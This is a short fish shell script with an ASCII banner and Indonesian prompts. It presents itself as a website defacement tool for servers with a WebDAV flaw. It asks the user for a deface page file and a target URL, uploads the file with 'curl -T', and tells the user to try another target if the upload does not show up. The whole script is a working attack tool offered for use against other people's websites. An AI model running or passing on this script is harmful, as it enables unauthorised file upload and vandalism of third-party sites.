#!/usr/bin/fish

clear
echo '''
\033[1;91m   __        _______ ____  ____    ___     __
   \ \      / / ____| __ )|  _ \  / \ \   / /
    \ \ /\ / /|  _| |  _ \| | | |/ _ \ \ / /
\033[1;37m     \ V  V / | |___| |_) | |_| / ___ \ V /
      \_/\_/  |_____|____/|____/_/   \_\_/
'''
echo
echo "           \033[1;91m[\033[1;37m======================\033[1;91m]"
echo "           \033[1;34m(\033[1;33mCreator\033[1;34m) \033[1;92m: \033[1;37mM_aref"
echo "           \033[1;34m(\033[1;33mYouTube\033[1;34m) \033[1;92m: \033[1;37mThe-X-Cyber "
echo "           \033[1;91m[\033[1;37m======================\033[1;91m]"
echo
echo '''
\033[1;37m  SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
     YANG VULN / RENTAN TERHADAP BUG WEBDAV
'''
echo
echo "\033[1;33m      Example : script.html"
echo "_:: NAMA SCRIPT DEFACE KALIAN ::_\033[1;37m"
echo -n " »--> : "
read sc
echo
echo "\033[1;33m  Example : http://site.com"
echo "_:: SITE TARGET KALIAN ::_\033[1;37m"
echo -n " »--> : "
read target
echo
echo "PROSES ..."
sleep 2
echo
echo
curl -T /storage/emulated/0/$sc $target
echo 'HASIL : '$target/$sc
echo '''
JIKA HASILNYA TERDEFACE BERARTI WEBSITE
TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
YANG LAIN :)
'''
